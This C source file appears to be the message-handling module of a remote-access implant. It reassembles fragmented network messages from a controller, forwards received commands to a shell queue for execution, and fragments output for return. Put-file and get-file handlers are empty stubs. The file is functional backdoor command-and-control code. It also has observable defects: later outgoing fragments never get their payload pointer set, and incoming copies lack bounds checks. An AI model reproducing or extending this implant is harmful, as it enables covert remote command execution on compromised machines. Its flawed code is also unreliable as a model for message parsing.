#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>

#include "queue.h"
#include "implant.h"
#include "utility.h"
#include "agent_handler.h"

// Globals
extern Queue* agent_receive_queue;
extern pthread_mutex_t agent_receive_queue_lock;
extern Queue* agent_send_queue;
extern pthread_mutex_t agent_send_queue_lock;
extern Queue* shell_receive_queue;
extern pthread_mutex_t shell_receive_queue_lock;
extern Queue* shell_send_queue;
extern pthread_mutex_t shell_send_queue_lock;

STATIC int agent_handle_command(Assembled_Message* a_message){
	Queue_Message* message = malloc(sizeof(Queue_Message));
	memset(message, 0, sizeof(Queue_Message));
	
	message->size = a_message->total_message_size;
	message->buffer = a_message->complete_message;
	
	debug_print("%s\n", "enqueing command request");
	enqueue(shell_send_queue, &shell_send_queue_lock, message);

	return 0;
}

STATIC int agent_handle_put_file(Assembled_Message* a_message){
	return 0;
}

STATIC int agent_handle_get_file(Assembled_Message* a_message){
	return 0;
}

STATIC int parse_first_fragment(Queue_Message* q_message, Assembled_Message* a_message){
	Fragment* fragment = q_message->fragment;
	debug_print("Fragment: %d, %d, %d, %s\n", ntohl(fragment->type), ntohl(fragment->index), ntohl(fragment->first_payload.total_size), fragment->first_payload.actual_payload);
	
	// check if we are receiving the first index of a message
	if (ntohl(fragment->index) != 0){
		debug_print("Out of order: %d\n", ntohl(fragment->index));
		return RET_ERROR;
	}
	a_message->last_fragment_index = ntohl(fragment->index);
	
	// assign type
	a_message->type = ntohl(fragment->type);
	
	// get payload size
	a_message->total_message_size = ntohl(fragment->first_payload.total_size);
	
	// allocate memory and null
	a_message->complete_message = malloc(a_message->total_message_size);
	memset(a_message->complete_message, 0, a_message->total_message_size);
	
	// get the size of payload in this fragment
	int this_payload_size = q_message->size - sizeof(fragment->type) - sizeof(fragment->index) - sizeof(fragment->first_payload.total_size);
	
	// copy payload (not including total message size) to message buffer
	memcpy(a_message->complete_message, fragment->first_payload.actual_payload, this_payload_size);
	
	// record current size of message
	a_message->current_message_size = this_payload_size;
	
	debug_print("first message:\t total_size: %d, current_message_size: %d, type: %d\n", a_message->total_message_size, a_message->current_message_size, a_message->type);
	
	free(q_message->fragment);
	free(q_message);
	return RET_OK;
}

STATIC int parse_next_fragment(Queue_Message* q_message, Assembled_Message* a_message){
	Fragment* fragment = q_message->fragment;
	
	// check if we are receiving the next expected index of a message
	if (ntohl(fragment->index) != a_message->last_fragment_index + 1 || ntohl(fragment->type) != a_message->type){
		return RET_ERROR;
	}
	a_message->last_fragment_index = ntohl(fragment->index);
	
	// get the size of payload in this fragment
	int this_payload_size = q_message->size - sizeof(fragment->type) - sizeof(fragment->index);
	
	// copy payload to end of message buffer
	memcpy(a_message->complete_message + a_message->current_message_size, fragment->next_payload, this_payload_size);
	
	// update current size of message
	a_message->current_message_size += this_payload_size;
	
	debug_print("next message:\tcurrent_message_size: %d, type: %d\n", a_message->current_message_size, a_message->type);
	
	free(q_message->fragment);
	free(q_message);
	return RET_OK;
}


int agent_handle_message_fragment(Assembled_Message* a_message){
	int ret_val = RET_OK;
	Queue_Message* q_message;

	if ((q_message = dequeue(agent_receive_queue, &agent_receive_queue_lock))){
		debug_print("dequeued message %d\n", q_message->size);
		
		if (a_message->last_fragment_index == -1){
		
			int retval = parse_first_fragment(q_message, a_message);
			if (retval != RET_OK){
				debug_print("%s\n", "first message out of order");
			}
		}
		else{
			int retval = parse_next_fragment(q_message, a_message);
			if (retval != RET_OK){
				a_message->last_fragment_index = -1;
				debug_print("%s\n", "next message out of order");
			}
		}
	}
	
	return ret_val;
}

int agent_handle_complete_message(Assembled_Message* a_message){
	int ret_val = RET_OK;
	
	if (a_message->last_fragment_index != -1 && a_message->total_message_size == a_message->current_message_size){
		debug_print("received full message %d, %d, %s\n", a_message->type, a_message->total_message_size, a_message->complete_message);
		a_message->last_fragment_index = -1;
		if (a_message->type == TYPE_COMMAND){
			agent_handle_command(a_message);
		}
		else if (a_message->type == TYPE_PUT_FILE){
			agent_handle_put_file(a_message);
		}
		else if (a_message->type == TYPE_GET_FILE){
			agent_handle_get_file(a_message);
		}
		else{
			printf("ERROR unknown fragment type\n");
			ret_val = RET_ERROR;
		}
	}
	
	return ret_val;
}

void* agent_handle_message(void*){
	int ret_val;
	Assembled_Message assembled_message = {0};
	assembled_message.last_fragment_index = -1;
	
	for (;;){
		if ((ret_val = agent_handle_message_fragment(&assembled_message)) != RET_OK){
			printf("ERROR agent_handle_message_fragment\n");
			exit(ret_val);
		}
		
		if ((ret_val = agent_handle_complete_message(&assembled_message)) != RET_OK){
			printf("ERROR agent_handle_complete_message\n");
			exit(ret_val);
		}
	}
	return 0;
}
	

int agent_prepare_message(int type, char* buffer, int message_size){
	Queue_Message* q_message;
	Fragment* fragment;
	int bytes_sent = 0;
	int index = 0;
	
	// prepare first fragment with size in first 4 bytes
	fragment = malloc(sizeof(Fragment));
	memset(fragment, 0, sizeof(Fragment));
	fragment->type = htonl(type);
	fragment->index = htonl(index++);
	fragment->first_payload.total_size = htonl(message_size);
	
	bytes_sent = message_size < FIRST_PAYLOAD_SIZE ? message_size : FIRST_PAYLOAD_SIZE;
	memcpy(fragment->first_payload.actual_payload, buffer, bytes_sent);
	
	q_message = malloc(sizeof(Queue_Message));
	memset(q_message, 0, sizeof(Queue_Message));
	q_message->size = sizeof(fragment->type) + sizeof(fragment->index) + sizeof(fragment->first_payload.total_size) + bytes_sent;
	q_message->fragment = fragment;

	debug_print("enqueing message to send: %d, %s\n", q_message->size, q_message->fragment->first_payload.actual_payload);
	enqueue(agent_send_queue, &agent_send_queue_lock, q_message);
	
	while (bytes_sent < message_size){
		fragment = malloc(sizeof(Fragment));
		memset(fragment, 0, sizeof(Fragment));
		fragment->type = htonl(type);
		fragment->index = htonl(index++);
		
		int num_fragment_bytes = (message_size - bytes_sent) < NEXT_PAYLOAD_SIZE ? (message_size - bytes_sent) : NEXT_PAYLOAD_SIZE;
		memcpy(fragment->next_payload, buffer + bytes_sent, num_fragment_bytes);
		
		q_message = malloc(sizeof(Queue_Message));
		memset(q_message, 0, sizeof(Queue_Message));
		q_message->size = sizeof(fragment->type) + sizeof(fragment->index) + num_fragment_bytes;

		enqueue(agent_send_queue, &agent_send_queue_lock, q_message);
		
		bytes_sent += num_fragment_bytes;
	}
	
	free(buffer);
	
	return 0;	
}




	